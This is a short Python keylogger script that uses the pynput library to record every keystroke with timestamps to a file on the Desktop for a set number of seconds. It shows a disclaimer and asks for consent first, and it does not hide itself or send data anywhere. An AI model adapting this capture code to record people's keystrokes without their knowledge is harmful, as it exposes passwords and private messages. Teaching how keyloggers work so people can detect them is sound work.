import pynput
import time
import os
import sys

# Find the correct Desktop path (handles both OneDrive and local Desktop)
desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
if not os.path.exists(desktop_path):  # If OneDrive Desktop doesn't exist, use the local one
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Define log file path
log_file_path = os.path.join(desktop_path, "keylogger_log.txt")

# Ensure the log directory exists
if not os.path.exists(desktop_path):
    print(f"Error: Desktop folder not found at {desktop_path}")
    sys.exit()

# Create the log file if it doesn't exist
open(log_file_path, "w").close()

# Keylogger function to capture keystrokes
def keylogger(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        event = f"{timestamp} - {key.char}\n"
    except AttributeError:
        event = f"{timestamp} - {key}\n"

    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(event)
    except Exception as e:
        print(f"Error writing to log file: {e}")

# Display disclaimer and get user consent
print("-" * 50)
print("⚠️ Keylogger Disclaimer ⚠️")
print("This program is for educational and ethical purposes only.")
print("Use only on devices where you have explicit permission.")
print("-" * 50)

accept_terms = input("Do you accept these terms and conditions? (y/n): ")
if accept_terms.lower() != 'y':
    print("You must accept the terms before using this program.")
    sys.exit()

# Get log duration
try:
    log_duration = int(input("Enter logging duration (in seconds): "))
except ValueError:
    print("Invalid input. Please enter a valid number.")
    sys.exit()

print(f"Logging keystrokes for {log_duration} seconds...")

# Start keylogger
listener = pynput.keyboard.Listener(on_press=keylogger)
listener.start()

# Run for specified duration
time.sleep(log_duration)

# Stop the keylogger
listener.stop()
print(f"\n✅ Log saved to: {log_file_path}")

# Open the log file automatically in Windows
os.startfile(log_file_path)
